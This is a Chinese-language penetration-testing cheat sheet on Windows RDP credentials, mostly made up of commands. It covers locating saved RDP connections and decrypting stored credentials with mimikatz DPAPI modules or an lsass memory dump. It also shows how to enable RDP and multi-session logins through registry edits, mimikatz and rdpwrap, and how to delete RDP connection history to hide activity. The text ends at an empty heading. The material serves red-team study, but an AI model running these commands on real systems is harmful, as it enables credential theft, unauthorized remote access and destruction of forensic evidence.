---
title: RDP凭据
date: 2025-03-13 14:29:35
updated: 2025-07-13 08:02:04
tags:
  - 内网
  - Windows信息收集
---
```shell
# windows
mstsc
# kali
rdesktop IP -d domian -u username
```

# 查看连接记录

Windows保存RDP凭据的目录是：

`C:\Users\用户名\AppData\Local\Microsoft\Credentials`  
注意： 打开隐藏受保护的操作系统文件

## cmdkey

```shell
cmdkey /list
```

![image.png](https://cdn.nlark.com/yuque/0/2025/png/39170111/1741876738908-dbe916c3-e9cb-4bec-9f9e-75a2d228dabe.png)

## 注册表

```shell
reg query "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers" /s
```

# 查看凭证

破解RDP连接凭证的前提是用户在连接远程主机时勾选了保存凭证

# mimikatz

使用 Master Key

```shell
dpapi::cred /in:C:\Users\USERNAME\AppData\Local\Microsoft\Credentials\SESSIONID
sekurlsa::dpapi
dpapi::cred /in:C:\Users\USERNAME\Desktop\test\SESSION /masterkey:对应的GUID key
```

或者使用procdump将lsass.exe进程dump回来然后获取masterkey

```shell
sekurlsa::minidump lsass.dmp //将lsaa.dmp导入
sekurlsa::dpapi
```

## netpass

远程桌面运行

# 查询rdp开放情况

## 进程

```shell
tasklist /svc | find "TermService" # 找到对应服务进程的PID
netstat -ano | find "PID" # 找到进程对应的端口号
```

## 注册表

```shell
REG QUERY "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections
```

## 端口号

0xd3d转换后为 3389

```shell
REG QUERY "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /V PortNumber
```

# 开启rdp端口

## windwos server 2003

开启3389

```shell
REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f
```

## windwos server 2008

管理员cmd执行

```shell
REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f
```

## windows server 2012

```shell
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fSingleSessionPerUser /t REG_DWORD /d 0 /f
```

# 开启多用户登录

## mimikatz

```shell
mimikatz # ts::multirdp
"TermService" service patched
```

## rdpwrap

(如果是Home版本可以用这个来Patch)[https://github.com/stascorp/rdpwrap/releases](https://github.com/stascorp/rdpwrap/releases)

安装：RDPWInst.exe -i is或者install.bat

![image.png](https://cdn.nlark.com/yuque/0/2025/png/39170111/1741877273024-bef251ab-13c5-4c59-9ce0-7da8e06e5654.png)

# 清除RDP连接记录

注意:操作注册表的时候谨慎操作，例如Default中肯定不止自行RDP连接的记录。

```shell
# 删除Default中的所有值
reg delete "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default" /va /f
# 删除整个Servers
reg delete "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers" /f
# 重新创建删除的注册表项
reg add "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers"
# 删除指定的项
reg delete "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default" /v MRUO /f
##删除rdp文件。
cd %userprofile%\documents\ # 转到Default.rdp文件目录
attrib Default.rdp -s -h # 更改Default.rdp文件属性，默认情况下它是隐藏
del Default.rdp # 删除文件Default.rdp文件
```

# hash登录